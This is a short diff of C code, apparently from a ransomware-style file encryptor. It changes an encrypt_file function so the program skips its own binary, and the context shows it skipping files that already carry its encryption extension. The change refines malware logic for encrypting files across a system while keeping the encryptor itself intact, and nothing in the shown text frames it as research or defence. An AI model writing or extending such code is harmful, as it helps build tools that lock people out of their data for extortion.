@@ -46,14 +46,29 @@ int encrypt_file(const char* name, void *arg) {
 	size_t name_strlen = strlen(name);
 	size_t ext_strlen = strlen(extension);
 
+	const char *my_basename = helper_get_own_basename();
+	if (!my_basename) {
+		bp("cannot get own basename");
+		return 1;
+	}
+
+	size_t base_strlen = strlen(my_basename);
+
+	if (name_strlen >= base_strlen) {
+		const char *file_end = name + (name_strlen - base_strlen);
+		if (memcmp(file_end, my_basename, base_strlen) == 0) {
+			bp("not encrypting own binary");
+			return 1;
+		}
+	}
+
 	if (name_strlen + ext_strlen >= PATH_MAX) {
 		bp("name would be longer than PATH_MAX");
 		return 1;
 	}
 
 	if (name_strlen >= ext_strlen) {
-		size_t orig_len = name_strlen - ext_strlen;
-		const char *file_ext = name + orig_len;
+		const char *file_ext = name + (name_strlen - ext_strlen);
 		if (memcmp(file_ext, extension, ext_strlen) == 0) {
 			bp("already encrypted");
 			return 1;
